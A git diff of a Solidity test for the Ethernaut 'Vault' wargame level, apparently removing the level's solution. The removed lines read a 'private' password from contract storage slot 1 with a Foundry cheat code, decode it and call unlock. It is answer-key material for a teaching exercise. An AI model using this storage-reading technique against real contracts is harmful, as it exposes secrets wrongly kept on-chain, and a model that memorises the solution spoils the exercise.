@@ -29,28 +29,6 @@ contract VaultTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
-        // Cheat code to load contract storage at specific slot
-        bytes32 password = vm.load(levelAddress, bytes32(uint256(1)));
-        // Log bytes stored at that memory location
-        emit log_bytes(abi.encodePacked(password)); 
-
-
-        // The following lines just convert from bytes32 to a string and logs it so you can see that the password we have obtained is correct
-        uint8 i = 0;
-
-        while(i < 32 && password[i] != 0) {
-            i++;
-        }
-        bytes memory bytesArray = new bytes(i);
-        for (i = 0; i < 32 && password[i] != 0; i++) {
-            bytesArray[i] = password[i];
-        }
-
-        emit log_string(string(bytesArray));
-
-        // Call the unlock function with the password we read from storage
-        ethernautVault.unlock(password);
-
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
